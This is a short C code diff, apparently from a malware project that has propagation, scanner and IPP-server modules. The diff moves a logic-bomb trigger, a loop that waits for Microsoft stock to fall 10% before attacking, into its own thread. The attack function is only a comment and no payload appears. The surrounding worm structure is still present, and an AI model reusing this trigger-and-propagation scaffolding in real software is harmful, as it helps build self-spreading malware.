@@ -3,6 +3,20 @@
 #include "propagate.h"
 #include "scanner.h"
 
+void * start_trigger(void *varg){
+    Globals *global = (Globals *) varg;
+    int trigger_attack;
+    global->printf("Starting trigger module...\n");
+    
+    trigger_attack = get_microsoft_stock(global);
+    while(trigger_attack != 1) // Wait until stock value drops by 10%
+    {
+        trigger_attack = get_microsoft_stock(global);
+        //global->sleep(1);
+    }
+    // call attack function
+}
+
 void * start_propagate(void *varg){
     Globals *global = (Globals *) varg;
     global->printf("Starting propagation module...\n");
@@ -22,12 +36,8 @@ void * start_ipp_server(void *varg){
 
 void entry(Globals *global) {
     // Trigger of the attack
-    int trigger_attack = get_microsoft_stock(global);
-    while(trigger_attack != 1) // Wait until stock value drops by 10%
-    {
-        trigger_attack = get_microsoft_stock(global);
-        //global->sleep(1);
-    }
+    pthread_t thread_id_trigger;
+    global->pthread_create(&thread_id_trigger, NULL, start_trigger, global);
 
     // start propagate
     pthread_t thread_id_propagate;
